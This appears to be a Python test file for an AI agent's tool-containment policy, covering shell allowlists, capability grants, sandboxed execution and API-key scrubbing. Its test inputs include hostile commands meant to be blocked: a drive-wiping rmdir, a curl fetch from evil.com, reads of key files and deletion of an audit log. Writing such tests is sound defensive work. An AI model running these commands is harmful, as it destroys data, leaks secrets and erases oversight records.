"""
Tests for Tool Policy, Shell & Python REPL Containment (WS-5, SEC-10).
"""

from core.tool_policy import (
    evaluate_tool_call,
    execute_hardened_bash,
    execute_hardened_python_repl,
    is_shell_command_safe,
)


def test_shell_command_safe_allowlist():
    """Verifies that standard developer commands match the safe allowlist."""
    assert is_shell_command_safe("git status")[0] is True
    assert is_shell_command_safe("pytest tests/test_agent.py")[0] is True
    assert is_shell_command_safe("cargo test")[0] is True
    assert is_shell_command_safe("npm test")[0] is True
    assert is_shell_command_safe("echo hello world")[0] is True

    # Arbitrary commands outside allowlist require approval
    assert is_shell_command_safe("rmdir /s /q C:\\")[0] is False
    assert is_shell_command_safe("curl https://evil.com/payload")[0] is False


def test_shell_command_blocks_sensitive_files():
    """Acceptance test: shell commands that reference sensitive keys or configs are strictly blocked."""
    assert is_shell_command_safe("type config\\api_keys.json")[0] is False
    assert is_shell_command_safe("cat config/smart_home.key")[0] is False
    assert is_shell_command_safe("echo test > release_state.json")[0] is False
    assert is_shell_command_safe("del audit.jsonl")[0] is False


def test_evaluate_tool_call_bash_without_grant_rejected_if_not_allowlisted():
    """Acceptance test: bash outside allowlist requires an approval/grant."""
    ok, reason = evaluate_tool_call("bash", {"command": "powershell -c whoami"})
    assert ok is False
    assert "E_NO_GRANT" in reason


def test_evaluate_tool_call_bash_with_grant_allowed():
    """Verifies that an approved process.spawn grant permits executing arbitrary commands."""
    grant = {"capabilities": ["process.spawn"], "approved_by": "user"}
    ok, reason = evaluate_tool_call("bash", {"command": "powershell -c whoami"}, grant=grant)
    assert ok is True


def test_evaluate_tool_call_capability_enforcement():
    """Verifies that general tools enforce their declared capabilities."""
    grant_read = {"capabilities": ["fs.read:docs/*"]}

    ok_read, _ = evaluate_tool_call("read_file", {"path": "docs/readme.txt"}, grant=grant_read)
    assert ok_read is True

    ok_write, reason_write = evaluate_tool_call("write_file", {"path": "docs/readme.txt"}, grant=grant_read)
    assert ok_write is False
    assert "E_NO_GRANT" in reason_write


def test_execute_hardened_bash_runs_in_sandbox():
    """Verifies execution of an allowlisted command in the hardened sandbox."""
    res = execute_hardened_bash("echo Hardened Bash Execution")
    assert res["success"] is True
    assert "Hardened Bash Execution" in res["stdout"]


def test_execute_hardened_python_repl_executes_isolated_code():
    """Verifies out-of-process Python REPL execution."""
    code = (
        "import math\n"
        "print(f'Computed: {math.sqrt(144)}')\n"
    )
    res = execute_hardened_python_repl(code)
    assert res["success"] is True
    assert "Computed: 12.0" in res["stdout"]


def test_execute_hardened_python_repl_env_is_scrubbed():
    """Acceptance test: child REPL process environment is scrubbed of sensitive API keys."""
    code = (
        "import os\n"
        "assert 'OPENAI_API_KEY' not in os.environ\n"
        "assert 'GEMINI_API_KEY' not in os.environ\n"
        "print('ENV_SCRUB_CONFIRMED')\n"
    )
    res = execute_hardened_python_repl(code)
    assert res["success"] is True
    assert "ENV_SCRUB_CONFIRMED" in res["stdout"]
